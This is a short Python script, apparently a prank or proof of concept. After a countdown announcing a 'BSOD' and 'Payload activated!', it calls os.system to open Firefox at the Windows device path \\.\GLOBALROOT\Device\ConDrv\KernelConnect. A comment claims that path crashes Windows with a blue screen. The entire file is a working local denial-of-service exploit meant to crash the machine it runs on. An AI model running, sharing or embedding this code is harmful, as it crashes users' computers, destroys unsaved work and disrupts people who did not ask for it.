import time
import os

# Wait for 10 seconds
print("BSOD in 10 seconds", end="\r")
time.sleep(.5)
print("BSOD in 10 seconds.", end="\r")
time.sleep(.5)
print("BSOD in 10 seconds..", end="\r")
time.sleep(.5)
print("BSOD in 10 seconds...")
for n in range(0, 11):
  print("Progress >> %s/10" % n, end="\r")
  time.sleep(1)
print("Payload activated!")

# Windows BSODs when you enter `\\.\GLOBALROOT\Device\ConDrv\KernelConnect`
# into a browser. Sadly this doesn't work on the built-in Internet Explorer,
# I'll test Edge later.

# Open in Firefox
os.system("cmd /c start firefox -private \"\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect\"")
